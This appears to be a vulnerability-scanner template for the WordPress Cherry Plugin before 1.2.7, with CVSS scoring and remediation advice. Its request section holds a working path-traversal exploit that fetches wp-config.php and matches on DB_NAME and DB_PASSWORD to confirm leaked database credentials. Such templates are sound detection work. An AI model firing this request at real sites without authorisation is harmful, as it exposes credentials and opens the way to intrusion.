id: cherry-file-download
info:
  name: Cherry Plugin < 1.2.7 - Arbitrary File Retrieval and File Upload
  author:
  - l0ne1y
  tags:
  - wordpress
  - wp-plugin
  - lfi
  description: |
    Wordpress Plugin Cherry Plugin < 1.2.7 has an arbitrary file download vulnerability
    The plugin is affected by an unauthenticated file upload and download vulnerability, allowing an attacker to upload and download arbitrary files. This could allow an attacker to upload a backdoor shell script or download a wp-config.php file.
  reference:
  - https://wpscan.com/vulnerability/90034817-dee7-40c9-80a2-1f1cd1d033ee
  - https://github.com/cherryframework/cherry-plugin
  severity: high
  classification:
    cwe-id:
    - cwe-22
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 8.6
  remediation: |-
    Official fix:
    1. It is recommended that users go to the official website to obtain the latest patches or the latest version of the program: https://wordpress.com/zh-cn/install-plugins/

    Temporary fix:
    1. Filter \".\" so that users cannot go back to the upper directory in the URL.
    2. Regular matching strictly determines the format of user input parameters, hard-codes or uniformly encodes the file name parameters passed by the user, performs whitelist control on file types, and rejects parameters containing malicious characters or null characters.
    3. Prohibit the system from providing directory traversal services, such as: php.ini configures open_basedir to limit file access scope.
    4. Save the file path to the database and let the user submit the file corresponding to the ID to download the file.
    5. Verify permissions before users download files.
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - DB_NAME
    - DB_PASSWORD
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php'
  method: GET
